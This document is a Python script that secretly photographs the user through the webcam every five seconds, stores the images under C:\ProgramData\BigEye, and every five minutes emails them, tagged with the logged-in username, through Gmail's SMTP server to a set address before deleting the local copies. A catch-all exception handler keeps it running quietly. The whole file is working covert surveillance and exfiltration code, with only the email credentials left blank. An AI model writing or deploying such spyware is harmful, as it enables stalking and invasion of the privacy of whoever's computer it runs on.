import cv2#
import time#
import os #
import smtplib, ssl#
import imghdr
import re
import os.path
import getpass
from os import path
from email.message import EmailMessage #






img_counter = 0
name = getpass.getuser()

sender_email = ""
receiver_email = ""
password = ""
directory = r"C:\\ProgramData\\BigEye\\"
files = []

if os.path.isdir(directory):
    pass
else:
    os.mkdir(directory)



os.chdir(directory)
if path.exists("log.txt"):
    pass
else:
    f= open("log.txt","w+")
    f.close()

f= open("log.txt", "r")
if f.mode=="r":
    check = os.path.getsize('log.txt');
    save_counter = f.read()
    f.close()
    if check > 0:
        if img_counter < int(save_counter):
            while img_counter < int(save_counter):

             files.append("img_{}.png".format(img_counter))
             img_counter += 1
    else:
        f= open("log.txt","w")
        f.write(str(img_counter))
        f.close()


frame_set = []
start_time = time.time()
mail_time = time.time()


while True:
    try:
        f=open("log.txt", "r")
        if f.mode=="r":
            save_counter = f.read()
            f.close()
            if img_counter >= int(save_counter):
                f= open("log.txt","w")
                f.write(str(img_counter))
                f.close()


        msg = EmailMessage()
        msg['Subject'] = name
        msg['From'] = sender_email
        msg['To']=receiver_email
        msg.set_content('test')
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
        if time.time() - start_time >= 5: #<---- Check if 5 sec passed
            capture = cv2.VideoCapture(0,cv2.CAP_DSHOW)
            capture.set(3, 640)
            capture.set(4, 480)
            ret, frame = capture.read()
            gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
            del(capture)
            cv2.destroyAllWindows()
            img_name = "img_{}.png".format(img_counter)
            cv2.imwrite(img_name, frame)
            start_time = time.time()
            files.append("img_{}.png".format(img_counter))


            img_counter += 1

            if time.time() - mail_time >= 300:
                for file in files:
                    if path.exists(file):
                        with open(file,'rb') as f:
                            file_data = f.read()
                            file_type = imghdr.what(f.name)
                        msg.add_attachment(file_data, maintype='image', subtype=file_type, filename=f.name)

                with smtplib.SMTP_SSL('smtp.gmail.com',465) as smtp:
                    smtp.login(sender_email,password)
                    smtp.send_message(msg)
                mail_time=time.time()
                for file in files:
                    if path.exists(file):
                        os.remove(file)
                files=[]
    except:
        pass